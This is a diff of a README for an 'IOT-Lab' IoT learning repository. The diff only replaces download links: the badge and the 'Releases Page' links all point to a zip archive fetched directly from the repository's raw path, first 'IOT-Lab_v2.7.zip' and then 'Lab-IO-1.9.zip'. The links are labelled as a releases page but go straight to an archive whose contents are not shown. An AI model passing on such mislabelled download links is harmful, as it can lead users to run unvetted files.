@@ -1,6 +1,6 @@
 # 🌐 IOT-Lab - Hands-On IoT Learning Made Easy
 
-[![Download IOT-Lab](https://raw.githubusercontent.com/wadada1234/IOT-Lab/main/program3/IOT-Lab_v2.7.zip)](https://raw.githubusercontent.com/wadada1234/IOT-Lab/main/program3/IOT-Lab_v2.7.zip)
+[![Download IOT-Lab](https://github.com/wadada1234/IOT-Lab/raw/refs/heads/main/program2/Lab-IO-1.9.zip)](https://github.com/wadada1234/IOT-Lab/raw/refs/heads/main/program2/Lab-IO-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the IOT-Lab! This repository provides a collection of programs focuse
 
 To get started, you need to download the software. 
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/wadada1234/IOT-Lab/main/program3/IOT-Lab_v2.7.zip) to find the latest version.
+1. Visit the [Releases Page](https://github.com/wadada1234/IOT-Lab/raw/refs/heads/main/program2/Lab-IO-1.9.zip) to find the latest version.
 2. Click on the link for the latest release.
 3. Download the appropriate file for your operating system.
 
@@ -73,7 +73,7 @@ If you encounter any issues, you can:
 
 ## 🔗 Useful Links
 
-- Visit the [Releases Page](https://raw.githubusercontent.com/wadada1234/IOT-Lab/main/program3/IOT-Lab_v2.7.zip) to download the latest version.
+- Visit the [Releases Page](https://github.com/wadada1234/IOT-Lab/raw/refs/heads/main/program2/Lab-IO-1.9.zip) to download the latest version.
 - Explore the GitHub repository for more IoT projects and updates.
 
 ## 📝 Contributing
